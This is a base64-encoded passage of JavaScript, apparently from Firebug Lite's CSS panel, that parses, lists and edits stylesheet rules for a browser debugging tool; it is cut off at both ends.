Zm94IHRvIHJlZ2VuZXJhdGUgaXQncyBDU1MgaGllcmFyY2h5Lg0KICAgICAgICAvLw0KICAgICAgICAvLyBXQVJOOiBUaGlzIGJlaGF2aW9yIHdhcyBkZXRlcm1pbmVkIGFuZWNkb3RhbGx5Lg0KICAgICAgICAvLyBTZWUgaHR0cDovL2NvZGUuZ29vZ2xlLmNvbS9wL2ZidWcvaXNzdWVzL2RldGFpbD9pZD0yNDQwDQogICAgICAgIHZhciBzdHlsZSA9IGRvYy5jcmVhdGVFbGVtZW50TlMoImh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiLCAic3R5bGUiKTsNCiAgICAgICAgc3R5bGUuc2V0QXR0cmlidXRlKCJjaGFyc2V0IiwidXRmLTgiKTsNCiAgICAgICAgdW53cmFwT2JqZWN0KHN0eWxlKS5maXJlYnVnSWdub3JlID0gdHJ1ZTsNCiAgICAgICAgc3R5bGUuc2V0QXR0cmlidXRlKCJ0eXBlIiwgInRleHQvY3NzIik7DQogICAgICAgIHN0eWxlLmlubmVySFRNTCA9ICIjZmJJZ25vcmVTdHlsZURPX05PVF9VU0Uge30iOw0KICAgICAgICBhZGRTdHlsZVNoZWV0KGRvYywgc3R5bGUpOw0KICAgICAgICBzdHlsZS5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKHN0eWxlKTsNCg0KICAgICAgICAvLyBodHRwczovL2J1Z3ppbGxhLm1vemlsbGEub3JnL3Nob3dfYnVnLmNnaT9pZD01MDAzNjUNCiAgICAgICAgLy8gVGhpcyB2b29kb28gdG91Y2hlcyBlYWNoIHN0eWxlIHNoZWV0IHRvIGZvcmNlIHNvbWUgRmlyZWZveCBpbnRlcm5hbCBjaGFuZ2UgdG8gYWxsb3cgZWRpdHMuDQogICAgICAgIHZhciBzdHlsZVNoZWV0cyA9IGdldEFsbFN0eWxlU2hlZXRzKGNvbnRleHQpOw0KICAgICAgICBmb3IodmFyIGkgPSAwOyBpIDwgc3R5bGVTaGVldHMubGVuZ3RoOyBpKyspDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBydWxlcyA9IHN0eWxlU2hlZXRzW2ldLmNzc1J1bGVzOw0KICAgICAgICAgICAgICAgIGlmIChydWxlcy5sZW5ndGggPiAwKQ0KICAgICAgICAgICAgICAgICAgICB2YXIgdG91Y2ggPSBydWxlc1swXTsNCiAgICAgICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ1NTICYmIHRvdWNoKQ0KICAgICAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiY3NzLnNob3coKSB0b3VjaCAiK3R5cGVvZih0b3VjaCkrIiBpbiAiKyhzdHlsZVNoZWV0c1tpXS5ocmVmP3N0eWxlU2hlZXRzW2ldLmhyZWY6Y29udGV4dC5nZXROYW1lKCkpKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoKGUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKEZCVHJhY2UuREJHX0VSUk9SUykNCiAgICAgICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImNzcy5zaG93OiBzaGVldC5jc3NSdWxlcyBGQUlMUyBmb3IgIisoc3R5bGVTaGVldHNbaV0/c3R5bGVTaGVldHNbaV0uaHJlZjoibnVsbCBzaGVldCIpK2UsIGUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSwNCiAgICBjbGVhbnVwU2hlZXRIYW5kbGVyOiBmdW5jdGlvbihldmVudCwgY29udGV4dCkNCiAgICB7DQogICAgICAgIHZhciB0YXJnZXQgPSBldmVudC50YXJnZXQgfHwgZXZlbnQuc3JjRWxlbWVudCwNCiAgICAgICAgICAgIHRhZ05hbWUgPSAodGFyZ2V0LnRhZ05hbWUgfHwgIiIpLnRvTG93ZXJDYXNlKCk7DQogICAgICAgIGlmICh0YWdOYW1lID09ICJsaW5rIikNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5jbGVhbnVwU2hlZXRzKHRhcmdldC5vd25lckRvY3VtZW50LCBjb250ZXh0KTsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgd2F0Y2hXaW5kb3c6IGZ1bmN0aW9uKGNvbnRleHQsIHdpbikNCiAgICB7DQogICAgICAgIHZhciBjbGVhbnVwU2hlZXRzID0gYmluZCh0aGlzLmNsZWFudXBTaGVldHMsIHRoaXMpLA0KICAgICAgICAgICAgY2xlYW51cFNoZWV0SGFuZGxlciA9IGJpbmQodGhpcy5jbGVhbnVwU2hlZXRIYW5kbGVyLCB0aGlzLCBjb250ZXh0KSwNCiAgICAgICAgICAgIGRvYyA9IHdpbi5kb2N1bWVudDsNCg0KICAgICAgICAvL2RvYy5hZGRFdmVudExpc3RlbmVyKCJET01BdHRyTW9kaWZpZWQiLCBjbGVhbnVwU2hlZXRIYW5kbGVyLCBmYWxzZSk7DQogICAgICAgIC8vZG9jLmFkZEV2ZW50TGlzdGVuZXIoIkRPTU5vZGVJbnNlcnRlZCIsIGNsZWFudXBTaGVldEhhbmRsZXIsIGZhbHNlKTsNCiAgICB9LA0KICAgIGxvYWRlZENvbnRleHQ6IGZ1bmN0aW9uKGNvbnRleHQpDQogICAgew0KICAgICAgICB2YXIgc2VsZiA9IHRoaXM7DQogICAgICAgIGl0ZXJhdGVXaW5kb3dzKGNvbnRleHQuYnJvd3Nlci5jb250ZW50V2luZG93LCBmdW5jdGlvbihzdWJ3aW4pDQogICAgICAgIHsNCiAgICAgICAgICAgIHNlbGYuY2xlYW51cFNoZWV0cyhzdWJ3aW4uZG9jdW1lbnQsIGNvbnRleHQpOw0KICAgICAgICB9KTsNCiAgICB9DQogICAgLyoqLw0KfSk7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQpGaXJlYnVnLkNTU1N0eWxlU2hlZXRQYW5lbCA9IGZ1bmN0aW9uKCkge307DQoNCkZpcmVidWcuQ1NTU3R5bGVTaGVldFBhbmVsLnByb3RvdHlwZSA9IGV4dGVuZChGaXJlYnVnLlNvdXJjZUJveFBhbmVsLA0Kew0KICAgIHRlbXBsYXRlOiBkb21wbGF0ZSgNCiAgICB7DQogICAgICAgIHRhZzoNCiAgICAgICAgICAgIERJVih7ImNsYXNzIjogImNzc1NoZWV0IGluc2VydEludG8gYTExeUNTU1ZpZXcifSwNCiAgICAgICAgICAgICAgICBGT1IoInJ1bGUiLCAiJHJ1bGVzIiwNCiAgICAgICAgICAgICAgICAgICAgQ1NTUnVsZVRhZw0KICAgICAgICAgICAgICAgICksDQogICAgICAgICAgICAgICAgRElWKHsiY2xhc3MiOiAiY3NzU2hlZXQgZWRpdGFibGUgaW5zZXJ0QmVmb3JlIn0sICIiKQ0KICAgICAgICAgICAgICAgICkNCiAgICB9KSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIHJlZnJlc2g6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmICh0aGlzLmxvY2F0aW9uKQ0KICAgICAgICAgICAgdGhpcy51cGRhdGVMb2NhdGlvbih0aGlzLmxvY2F0aW9uKTsNCiAgICAgICAgZWxzZSBpZiAodGhpcy5zZWxlY3Rpb24pDQogICAgICAgICAgICB0aGlzLnVwZGF0ZVNlbGVjdGlvbih0aGlzLnNlbGVjdGlvbik7DQogICAgfSwNCg0KICAgIHRvZ2dsZUVkaXRpbmc6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmICghdGhpcy5zdHlsZXNoZWV0RWRpdG9yKQ0KICAgICAgICAgICAgdGhpcy5zdHlsZXNoZWV0RWRpdG9yID0gbmV3IFN0eWxlU2hlZXRFZGl0b3IodGhpcy5kb2N1bWVudCk7DQoNCiAgICAgICAgaWYgKHRoaXMuZWRpdGluZykNCiAgICAgICAgICAgIEZpcmVidWcuRWRpdG9yLnN0b3BFZGl0aW5nKCk7DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKCF0aGlzLmxvY2F0aW9uKQ0KICAgICAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICAgICAgdmFyIHN0eWxlU2hlZXQgPSB0aGlzLmxvY2F0aW9uLmVkaXRTdHlsZVNoZWV0DQogICAgICAgICAgICAgICAgPyB0aGlzLmxvY2F0aW9uLmVkaXRTdHlsZVNoZWV0LnNoZWV0DQogICAgICAgICAgICAgICAgOiB0aGlzLmxvY2F0aW9uOw0KDQogICAgICAgICAgICB2YXIgY3NzID0gZ2V0U3R5bGVTaGVldENTUyhzdHlsZVNoZWV0LCB0aGlzLmNvbnRleHQpOw0KICAgICAgICAgICAgLy92YXIgdG9wbW9zdCA9IGdldFRvcG1vc3RSdWxlTGluZSh0aGlzLnBhbmVsTm9kZSk7DQoNCiAgICAgICAgICAgIHRoaXMuc3R5bGVzaGVldEVkaXRvci5zdHlsZVNoZWV0ID0gdGhpcy5sb2NhdGlvbjsNCiAgICAgICAgICAgIEZpcmVidWcuRWRpdG9yLnN0YXJ0RWRpdGluZyh0aGlzLnBhbmVsTm9kZSwgY3NzLCB0aGlzLnN0eWxlc2hlZXRFZGl0b3IpOw0KICAgICAgICAgICAgLy90aGlzLnN0eWxlc2hlZXRFZGl0b3Iuc2Nyb2xsVG9MaW5lKHRvcG1vc3QubGluZSwgdG9wbW9zdC5vZmZzZXQpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGdldFN0eWxlc2hlZXRVUkw6IGZ1bmN0aW9uKHJ1bGUpDQogICAgew0KICAgICAgICBpZiAodGhpcy5sb2NhdGlvbi5ocmVmKQ0KICAgICAgICAgICAgcmV0dXJuIHRoaXMubG9jYXRpb24uaHJlZjsNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgcmV0dXJuIHRoaXMuY29udGV4dC53aW5kb3cubG9jYXRpb24uaHJlZjsNCiAgICB9LA0KDQogICAgZ2V0UnVsZUJ5TGluZTogZnVuY3Rpb24oc3R5bGVTaGVldCwgbGluZSkNCiAgICB7DQogICAgICAgIGlmICghZG9tVXRpbHMpDQogICAgICAgICAgICByZXR1cm4gbnVsbDsNCg0KICAgICAgICB2YXIgY3NzUnVsZXMgPSBzdHlsZVNoZWV0LmNzc1J1bGVzOw0KICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGNzc1J1bGVzLmxlbmd0aDsgKytpKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgcnVsZSA9IGNzc1J1bGVzW2ldOw0KICAgICAgICAgICAgaWYgKHJ1bGUgaW5zdGFuY2VvZiBDU1NTdHlsZVJ1bGUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHJ1bGVMaW5lID0gZG9tVXRpbHMuZ2V0UnVsZUxpbmUocnVsZSk7DQogICAgICAgICAgICAgICAgaWYgKHJ1bGVMaW5lID49IGxpbmUpDQogICAgICAgICAgICAgICAgICAgIHJldHVybiBydWxlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGhpZ2hsaWdodFJ1bGU6IGZ1bmN0aW9uKHJ1bGUpDQogICAgew0KICAgICAgICB2YXIgcnVsZUVsZW1lbnQgPSBGaXJlYnVnLmdldEVsZW1lbnRCeVJlcE9iamVjdCh0aGlzLnBhbmVsTm9kZS5maXJzdENoaWxkLCBydWxlKTsNCiAgICAgICAgaWYgKHJ1bGVFbGVtZW50KQ0KICAgICAgICB7DQogICAgICAgICAgICBzY3JvbGxJbnRvQ2VudGVyVmlldyhydWxlRWxlbWVudCwgdGhpcy5wYW5lbE5vZGUpOw0KICAgICAgICAgICAgc2V0Q2xhc3NUaW1lZChydWxlRWxlbWVudCwgImp1bXBIaWdobGlnaHQiLCB0aGlzLmNvbnRleHQpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGdldFN0eWxlU2hlZXRSdWxlczogZnVuY3Rpb24oY29udGV4dCwgc3R5bGVTaGVldCkNCiAgICB7DQogICAgICAgIHZhciBpc1N5c3RlbVNoZWV0ID0gaXNTeXN0ZW1TdHlsZVNoZWV0KHN0eWxlU2hlZXQpOw0KDQogICAgICAgIGZ1bmN0aW9uIGFwcGVuZFJ1bGVzKGNzc1J1bGVzKQ0KICAgICAgICB7DQogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGNzc1J1bGVzLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBydWxlID0gY3NzUnVsZXNbaV07DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gb3BlcmEgaW5zdGFuY2VvZiBzdHlsZXNoZWV0IHJlbW92ZSB0aGUgZm9sbG93aW5nIGNvbW1lbnRzIHdoZW4gDQogICAgICAgICAgICAgICAgLy8gdGhlIGlzc3VlIHdpdGggb3BlcmEgYW5kIHN0eWxlIHNoZWV0IENsYXNzZXMgaGFzIGJlZW4gc29sdmVkLg0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIC8vaWYgKHJ1bGUgaW5zdGFuY2VvZiBDU1NTdHlsZVJ1bGUpDQogICAgICAgICAgICAgICAgaWYgKGluc3RhbmNlT2YocnVsZSwgIkNTU1N0eWxlUnVsZSIpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHByb3BzID0gdGhpcy5nZXRSdWxlUHJvcGVydGllcyhjb250ZXh0LCBydWxlKTsNCiAgICAgICAgICAgICAgICAgICAgLy92YXIgbGluZSA9IGRvbVV0aWxzLmdldFJ1bGVMaW5lKHJ1bGUpOw0KICAgICAgICAgICAgICAgICAgICB2YXIgbGluZSA9IG51bGw7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICB2YXIgc2VsZWN0b3IgPSBydWxlLnNlbGVjdG9yVGV4dDsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmIChpc0lFKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBzZWxlY3RvciA9IHNlbGVjdG9yLnJlcGxhY2UocmVTZWxlY3RvclRhZywgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKHMpe3JldHVybiBzLnRvTG93ZXJDYXNlKCk7fSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHZhciBydWxlSWQgPSBydWxlLnNlbGVjdG9yVGV4dCsiLyIrbGluZTsNCiAgICAgICAgICAgICAgICAgICAgcnVsZXMucHVzaCh7dGFnOiBDU1NTdHlsZVJ1bGVUYWcudGFnLCBydWxlOiBydWxlLCBpZDogcnVsZUlkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxlY3Rvcjogc2VsZWN0b3IsIHByb3BzOiBwcm9wcywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNTeXN0ZW1TaGVldDogaXNTeXN0ZW1TaGVldCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNTZWxlY3RvckVkaXRhYmxlOiB0cnVlfSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIC8vZWxzZSBpZiAocnVsZSBpbnN0YW5jZW9mIENTU0ltcG9ydFJ1bGUpDQogICAgICAgICAgICAgICAgZWxzZSBpZiAoaW5zdGFuY2VPZihydWxlLCAiQ1NTSW1wb3J0UnVsZSIpKQ0KICAgICAgICAgICAgICAgICAgICBydWxlcy5wdXNoKHt0YWc6IENTU0ltcG9ydFJ1bGVUYWcudGFnLCBydWxlOiBydWxlfSk7DQogICAgICAgICAgICAgICAgLy9lbHNlIGlmIChydWxlIGluc3RhbmNlb2YgQ1NTTWVkaWFSdWxlKQ0KICAgICAgICAgICAgICAgIGVsc2UgaWYgKGluc3RhbmNlT2YocnVsZSwgIkNTU01lZGlhUnVsZSIpKQ0KICAgICAgICAgICAgICAgICAgICBhcHBlbmRSdWxlcy5hcHBseSh0aGlzLCBbcnVsZS5jc3NSdWxlc10pOw0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19FUlJPUlMgfHwgRkJUcmFjZS5EQkdfQ1NTKQ0KICAgICAgICAgICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImNzcyBnZXRTdHlsZVNoZWV0UnVsZXMgZmFpbGVkIHRvIGNsYXNzaWZ5IGEgcnVsZSAiLCBydWxlKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICB2YXIgcnVsZXMgPSBbXTsNCiAgICAgICAgYXBwZW5kUnVsZXMuYXBwbHkodGhpcywgW3N0eWxlU2hlZXQuY3NzUnVsZXMgfHwgc3R5bGVTaGVldC5ydWxlc10pOw0KICAgICAgICByZXR1cm4gcnVsZXM7DQogICAgfSwNCg0KICAgIHBhcnNlQ1NTUHJvcHM6IGZ1bmN0aW9uKHN0eWxlLCBpbmhlcml0TW9kZSkNCiAgICB7DQogICAgICAgIHZhciBwcm9wcyA9IFtdOw0KDQogICAgICAgIGlmIChGaXJlYnVnLmV4cGFuZFNob3J0aGFuZFByb3BzKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgY291bnQgPSBzdHlsZS5sZW5ndGgtMSwNCiAgICAgICAgICAgICAgICBpbmRleCA9IHN0eWxlLmxlbmd0aDsNCiAgICAgICAgICAgIHdoaWxlIChpbmRleC0tKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBwcm9wTmFtZSA9IHN0eWxlLml0ZW0oY291bnQgLSBpbmRleCk7DQogICAgICAgICAgICAgICAgdGhpcy5hZGRQcm9wZXJ0eShwcm9wTmFtZSwgc3R5bGUuZ2V0UHJvcGVydHlWYWx1ZShwcm9wTmFtZSksICEhc3R5bGUuZ2V0UHJvcGVydHlQcmlvcml0eShwcm9wTmFtZSksIGZhbHNlLCBpbmhlcml0TW9kZSwgcHJvcHMpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGxpbmVzID0gc3R5bGUuY3NzVGV4dC5tYXRjaCgvKD86W147XChdKig/OlwoW15cKV0qP1wpKT9bXjtcKF0qKSo7Py9nKTsNCiAgICAgICAgICAgIHZhciBwcm9wUkUgPSAvXHMqKFteOlxzXSopXHMqOlxzKiguKj8pXHMqKCEgaW1wb3J0YW50KT87PyQvOw0KICAgICAgICAgICAgdmFyIGxpbmUsaT0wOw0KICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gcG9ydCB0byBmaXJlYnVnOiB2YXJpYWJsZSBsZWFrZWQgaW50byBnbG9iYWwgbmFtZXNwYWNlDQogICAgICAgICAgICB2YXIgbTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgd2hpbGUobGluZT1saW5lc1tpKytdKXsNCiAgICAgICAgICAgICAgICBtID0gcHJvcFJFLmV4ZWMobGluZSk7DQogICAgICAgICAgICAgICAgaWYoIW0pDQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgIC8vdmFyIG5hbWUgPSBtWzFdLCB2YWx1ZSA9IG1bMl0sIGltcG9ydGFudCA9ICEhbVszXTsNCiAgICAgICAgICAgICAgICBpZiAobVsyXSkNCiAgICAgICAgICAgICAgICAgICAgdGhpcy5hZGRQcm9wZXJ0eShtWzFdLCBtWzJdLCAhIW1bM10sIGZhbHNlLCBpbmhlcml0TW9kZSwgcHJvcHMpOw0KICAgICAgICAgICAgfTsNCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiBwcm9wczsNCiAgICB9LA0KDQogICAgZ2V0UnVsZVByb3BlcnRpZXM6IGZ1bmN0aW9uKGNvbnRleHQsIHJ1bGUsIGluaGVyaXRNb2RlKQ0KICAgIHsNCiAgICAgICAgdmFyIHByb3BzID0gdGhpcy5wYXJzZUNTU1Byb3BzKHJ1bGUuc3R5bGUsIGluaGVyaXRNb2RlKTsNCg0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBwb3J0IHRvIGZpcmVidWc6IHZhcmlhYmxlIGxlYWtlZCBpbnRvIGdsb2JhbCBuYW1lc3BhY2UgDQogICAgICAgIC8vdmFyIGxpbmUgPSBkb21VdGlscy5nZXRSdWxlTGluZShydWxlKTsNCiAgICAgICAgdmFyIGxpbmU7DQogICAgICAgIHZhciBydWxlSWQgPSBydWxlLnNlbGVjdG9yVGV4dCsiLyIrbGluZTsNCiAgICAgICAgdGhpcy5hZGRPbGRQcm9wZXJ0aWVzKGNvbnRleHQsIHJ1bGVJZCwgaW5oZXJpdE1vZGUsIHByb3BzKTsNCiAgICAgICAgc29ydFByb3BlcnRpZXMocHJvcHMpOw0KDQogICAgICAgIHJldHVybiBwcm9wczsNCiAgICB9LA0KDQogICAgYWRkT2xkUHJvcGVydGllczogZnVuY3Rpb24oY29udGV4dCwgcnVsZUlkLCBpbmhlcml0TW9kZSwgcHJvcHMpDQogICAgew0KICAgICAgICBpZiAoY29udGV4dC5zZWxlY3Rvck1hcCAmJiBjb250ZXh0LnNlbGVjdG9yTWFwLmhhc093blByb3BlcnR5KHJ1bGVJZCkgKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgbW9yZVByb3BzID0gY29udGV4dC5zZWxlY3Rvck1hcFtydWxlSWRdOw0KICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBtb3JlUHJvcHMubGVuZ3RoOyArK2kpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHByb3AgPSBtb3JlUHJvcHNbaV07DQogICAgICAgICAgICAgICAgdGhpcy5hZGRQcm9wZXJ0eShwcm9wLm5hbWUsIHByb3AudmFsdWUsIHByb3AuaW1wb3J0YW50LCB0cnVlLCBpbmhlcml0TW9kZSwgcHJvcHMpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGFkZFByb3BlcnR5OiBmdW5jdGlvbihuYW1lLCB2YWx1ZSwgaW1wb3J0YW50LCBkaXNhYmxlZCwgaW5oZXJpdE1vZGUsIHByb3BzKQ0KICAgIHsNCiAgICAgICAgbmFtZSA9IG5hbWUudG9Mb3dlckNhc2UoKTsNCiAgICAgICAgDQogICAgICAgIGlmIChpbmhlcml0TW9kZSAmJiAhaW5oZXJpdGVkU3R5bGVOYW1lc1tuYW1lXSkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICBuYW1lID0gdGhpcy50cmFuc2xhdGVOYW1lKG5hbWUsIHZhbHVlKTsNCiAgICAgICAgaWYgKG5hbWUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhbHVlID0gc3RyaXBVbml0cyhyZ2JUb0hleCh2YWx1ZSkpOw0KICAgICAgICAgICAgaW1wb3J0YW50ID0gaW1wb3J0YW50ID8gIiAhaW1wb3J0YW50IiA6ICIiOw0KDQogICAgICAgICAgICB2YXIgcHJvcCA9IHtuYW1lOiBuYW1lLCB2YWx1ZTogdmFsdWUsIGltcG9ydGFudDogaW1wb3J0YW50LCBkaXNhYmxlZDogZGlzYWJsZWR9Ow0KICAgICAgICAgICAgcHJvcHMucHVzaChwcm9wKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICB0cmFuc2xhdGVOYW1lOiBmdW5jdGlvbihuYW1lLCB2YWx1ZSkNCiAgICB7DQogICAgICAgIC8vIERvbid0IHNob3cgdGhlc2UgcHJvcHJpZXRhcnkgTW96aWxsYSBwcm9wZXJ0aWVzDQogICAgICAgIGlmICgodmFsdWUgPT0gIi1tb3otaW5pdGlhbCINCiAgICAgICAgICAgICYmIChuYW1lID09ICItbW96LWJhY2tncm91bmQtY2xpcCIgfHwgbmFtZSA9PSAiLW1vei1iYWNrZ3JvdW5kLW9yaWdpbiINCiAgICAgICAgICAgICAgICB8fCBuYW1lID09ICItbW96LWJhY2tncm91bmQtaW5saW5lLXBvbGljeSIpKQ0KICAgICAgICB8fCAodmFsdWUgPT0gInBoeXNpY2FsIg0KICAgICAgICAgICAgJiYgKG5hbWUgPT0gIm1hcmdpbi1sZWZ0LWx0ci1zb3VyY2UiIHx8IG5hbWUgPT0gIm1hcmdpbi1sZWZ0LXJ0bC1zb3VyY2UiDQogICAgICAgICAgICAgICAgfHwgbmFtZSA9PSAibWFyZ2luLXJpZ2h0LWx0ci1zb3VyY2UiIHx8IG5hbWUgPT0gIm1hcmdpbi1yaWdodC1ydGwtc291cmNlIikpDQogICAgICAgIHx8ICh2YWx1ZSA9PSAicGh5c2ljYWwiDQogICAgICAgICAgICAmJiAobmFtZSA9PSAicGFkZGluZy1sZWZ0LWx0ci1zb3VyY2UiIHx8IG5hbWUgPT0gInBhZGRpbmctbGVmdC1ydGwtc291cmNlIg0KICAgICAgICAgICAgICAgIHx8IG5hbWUgPT0gInBhZGRpbmctcmlnaHQtbHRyLXNvdXJjZSIgfHwgbmFtZSA9PSAicGFkZGluZy1yaWdodC1ydGwtc291cmNlIikpKQ0KICAgICAgICAgICAgcmV0dXJuIG51bGw7DQoNCiAgICAgICAgLy8gVHJhbnNsYXRlIHRoZXNlIGJhY2sgdG8gdGhlIGZvcm0gdGhlIHVzZXIgcHJvYmFibHkgZXhwZWN0cw0KICAgICAgICBpZiAobmFtZSA9PSAibWFyZ2luLWxlZnQtdmFsdWUiKQ0KICAgICAgICAgICAgcmV0dXJuICJtYXJnaW4tbGVmdCI7DQogICAgICAgIGVsc2UgaWYgKG5hbWUgPT0gIm1hcmdpbi1yaWdodC12YWx1ZSIpDQogICAgICAgICAgICByZXR1cm4gIm1hcmdpbi1yaWdodCI7DQogICAgICAgIGVsc2UgaWYgKG5hbWUgPT0gIm1hcmdpbi10b3AtdmFsdWUiKQ0KICAgICAgICAgICAgcmV0dXJuICJtYXJnaW4tdG9wIjsNCiAgICAgICAgZWxzZSBpZiAobmFtZSA9PSAibWFyZ2luLWJvdHRvbS12YWx1ZSIpDQogICAgICAgICAgICByZXR1cm4gIm1hcmdpbi1ib3R0b20iOw0KICAgICAgICBlbHNlIGlmIChuYW1lID09ICJwYWRkaW5nLWxlZnQtdmFsdWUiKQ0KICAgICAgICAgICAgcmV0dXJuICJwYWRkaW5nLWxlZnQiOw0KICAgICAgICBlbHNlIGlmIChuYW1lID09ICJwYWRkaW5nLXJpZ2h0LXZhbHVlIikNCiAgICAgICAgICAgIHJldHVybiAicGFkZGluZy1yaWdodCI7DQogICAgICAgIGVsc2UgaWYgKG5hbWUgPT0gInBhZGRpbmctdG9wLXZhbHVlIikNCiAgICAgICAgICAgIHJldHVybiAicGFkZGluZy10b3AiOw0KICAgICAgICBlbHNlIGlmIChuYW1lID09ICJwYWRkaW5nLWJvdHRvbS12YWx1ZSIpDQogICAgICAgICAgICByZXR1cm4gInBhZGRpbmctYm90dG9tIjsNCiAgICAgICAgLy8gWFhYam9lIFdoYXQgYWJvdXQgYm9yZGVyIQ0KICAgICAgICBlbHNlDQogICAgICAgICAgICByZXR1cm4gbmFtZTsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgZWRpdEVsZW1lbnRTdHlsZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgLy8vdmFyIHJ1bGVzQm94ID0gdGhpcy5wYW5lbE5vZGUuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgiY3NzRWxlbWVudFJ1bGVDb250YWluZXIiKVswXTsNCiAgICAgICAgdmFyIHJ1bGVzQm94ID0gJCQoIi5jc3NFbGVtZW50UnVsZUNvbnRhaW5lciIsIHRoaXMucGFuZWxOb2RlKVswXTsNCiAgICAgICAgdmFyIHN0eWxlUnVsZUJveCA9IHJ1bGVzQm94ICYmIEZpcmVidWcuZ2V0RWxlbWVudEJ5UmVwT2JqZWN0KHJ1bGVzQm94LCB0aGlzLnNlbGVjdGlvbik7DQogICAgICAgIGlmICghc3R5bGVSdWxlQm94KQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgcnVsZSA9IHtydWxlOiB0aGlzLnNlbGVjdGlvbiwgaW5oZXJpdGVkOiBmYWxzZSwgc2VsZWN0b3I6ICJlbGVtZW50LnN0eWxlIiwgcHJvcHM6IFtdfTsNCiAgICAgICAgICAgIGlmICghcnVsZXNCb3gpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gVGhlIGVsZW1lbnQgZGlkIG5vdCBoYXZlIGFueSBkaXNwbGF5ZWQgc3R5bGVzLiBXZSBuZWVkIHRvIGNyZWF0ZSB0aGUgd2hvbGUgdHJlZSBhbmQgcmVtb3ZlDQogICAgICAgICAgICAgICAgLy8gdGhlIG5vIHN0eWxlcyBtZXNzYWdlDQogICAgICAgICAgICAgICAgc3R5bGVSdWxlQm94ID0gdGhpcy50ZW1wbGF0ZS5jYXNjYWRlZFRhZy5yZXBsYWNlKHsNCiAgICAgICAgICAgICAgICAgICAg